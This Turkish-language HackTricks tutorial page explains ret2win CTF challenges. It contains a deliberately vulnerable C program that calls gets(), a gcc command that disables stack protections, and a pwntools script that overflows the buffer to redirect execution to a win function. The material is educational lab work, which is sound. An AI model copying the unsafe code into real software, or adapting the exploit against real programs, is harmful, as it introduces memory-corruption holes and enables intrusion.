# Ret2win

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

**Ret2win** zorlukları, özellikle **binary exploitation** içeren görevlerde, **Capture The Flag (CTF)** yarışmalarında popüler bir kategoridir. Amaç, verilen bir ikili dosyadaki bir zafiyeti sömürerek, genellikle `win`, `ret2win` vb. gibi adlandırılan belirli bir çağrılmamış işlevi çalıştırmaktır. Bu işlev çalıştırıldığında genellikle bir bayrak veya başarı mesajı yazdırır. Genellikle, istenen işleve yürütme akışını yönlendirmek için yığın üzerindeki **dönüş adresini** üzerine yazarak bir zafiyeti sömürmek gerekmektedir. İşte örneklerle daha detaylı bir açıklama:

### C Örneği

Zafiyeti olan basit bir C programı ve çağırmayı amaçladığımız bir `win` işlevi düşünelim:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Bu programı yığın korumaları olmadan ve **ASLR** devre dışı bırakılarak derlemek için aşağıdaki komutu kullanabilirsiniz:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Programı 32 bitlik bir ikili olarak derler (bu isteğe bağlıdır ancak CTF zorluklarında yaygındır).
* `-fno-stack-protector`: Stack overflow'lara karşı korumaları devre dışı bırakır.
* `-z execstack`: Stack üzerinde kodun çalışmasına izin verir.
* `-no-pie`: Adresin `win` fonksiyonunun değişmediğinden emin olmak için Konum Bağımsız Yürütülebilirliği devre dışı bırakır.
* `-o vulnerable`: Çıkış dosyasını `vulnerable` olarak adlandırır.

### Pwntools Kullanarak Python Sızma

Sızma için güçlü bir CTF çerçevesi olan **pwntools** kullanacağız. Sızma betiği, tamponu taşırarak ve dönüş adresini `win` fonksiyonunun adresiyle değiştirerek bir saldırı yükü oluşturacaktır.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Adresini `win` fonksiyonunun adresini bulmak için **gdb**, **objdump** veya binary dosyaları incelemenize izin veren diğer herhangi bir aracı kullanabilirsiniz. Örneğin, `objdump` ile şunu kullanabilirsiniz:
```sh
objdump -d vulnerable | grep win
```
Bu komut, `win` fonksiyonunun montajını ve başlangıç adresini gösterecektir.

Python betiği, `vulnerable_function` tarafından işlendiğinde, tamamen özenle oluşturulmuş bir ileti gönderir ve tampon taşması gerçekleşir, yığın üzerindeki dönüş adresini `win` adresi ile üzerine yazar. `vulnerable_function` geri döndüğünde, `main`e dönmemek veya çıkmamak yerine `win`e atlar ve ileti yazdırılır.

## Korumalar

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **devre dışı bırakılmalıdır** ki adres, her yürütmede güvenilir olsun veya fonksiyonun depolanacağı adres her zaman aynı olmayacak ve `win` fonksiyonunun nerede yüklendiğini bulmak için bir sızıntıya ihtiyacınız olacaktır.
* [**Yığın Kanaryaları**](../common-binary-protections-and-bypasses/stack-canaries/) da devre dışı bırakılmalıdır aksi takdirde tehlikeye düşmüş EIP dönüş adresi asla takip edilmeyecek.

## Diğer örnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bit, ASLR yok
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bit, ASLR ile, bin adresinin sızdırılmasıyla
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bit, ASLR yok
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bit, ASLR yok, çift küçük taşma, yığını taşmak ve ikinci taşmanın boyutunu genişletmek için ilk taşma
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bit, relro, kanarya yok, nx, pie yok, `fflush` adresini `win` fonksiyonu ile üzerine yazmak için format dizesi (ret2win)
